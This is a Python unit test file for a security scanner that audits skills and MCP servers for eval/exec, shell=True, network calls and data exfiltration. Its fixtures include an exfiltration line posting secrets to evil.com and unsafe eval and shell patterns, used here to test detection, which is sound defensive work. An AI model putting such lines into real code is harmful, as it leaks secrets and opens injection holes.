#!/usr/bin/env python3
"""Unit tests for skill/MCP security audit system."""
import os
import sys
import tempfile
import unittest
from pathlib import Path

_SCRIPTS = Path(__file__).parent.parent
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))


class TestFinding(unittest.TestCase):
    def test_finding_fields(self):
        from security.scanner import Finding
        f = Finding(
            category="obfuscation",
            severity="CRITICAL",
            line_no=42,
            snippet="eval(user_input)",
            context="line 41\neval(user_input)\nline 43",
        )
        self.assertEqual(f.category, "obfuscation")
        self.assertEqual(f.severity, "CRITICAL")
        self.assertEqual(f.line_no, 42)
        self.assertEqual(f.snippet, "eval(user_input)")
        self.assertEqual(f.context, "line 41\neval(user_input)\nline 43")


class TestScanner(unittest.TestCase):
    def _scan(self, code: str) -> list:
        from security.scanner import scan
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(code)
            fname = f.name
        try:
            return scan(fname)
        finally:
            os.unlink(fname)

    def test_detects_eval(self):
        findings = self._scan("result = eval(user_input)\n")
        cats = [f.category for f in findings]
        sevs = [f.severity for f in findings]
        self.assertIn("obfuscation", cats)
        self.assertIn("CRITICAL", sevs)

    def test_detects_shell_true(self):
        findings = self._scan("subprocess.run(cmd, shell=True)\n")
        cats = [f.category for f in findings]
        self.assertIn("shell_injection", cats)
        highs = [f for f in findings if f.severity == "HIGH"]
        self.assertTrue(len(highs) >= 1)

    def test_detects_exfiltration(self):
        findings = self._scan('requests.post("http://evil.com/steal", data=secrets)\n')
        cats = [f.category for f in findings]
        self.assertIn("exfiltration", cats)
        crits = [f for f in findings if f.severity == "CRITICAL"]
        self.assertTrue(len(crits) >= 1)

    def test_clean_file_no_findings(self):
        findings = self._scan(
            "def greet(name: str) -> str:\n"
            "    return f'Hello, {name}'\n"
        )
        self.assertEqual(findings, [])

    def test_detects_network_import(self):
        findings = self._scan("import requests\ndata = requests.get(url)\n")
        cats = [f.category for f in findings]
        self.assertIn("network", cats)

    def test_detects_exec(self):
        findings = self._scan("exec(compile(src, '<str>', 'exec'))\n")
        crits = [f for f in findings if f.severity == "CRITICAL"]
        self.assertTrue(len(crits) >= 1)

    def test_snippet_capped_at_120(self):
        long_line = "x = " + "a" * 200 + "\n"
        findings = self._scan(long_line)
        for f in findings:
            self.assertLessEqual(len(f.snippet), 120)


if __name__ == "__main__":
    unittest.main()
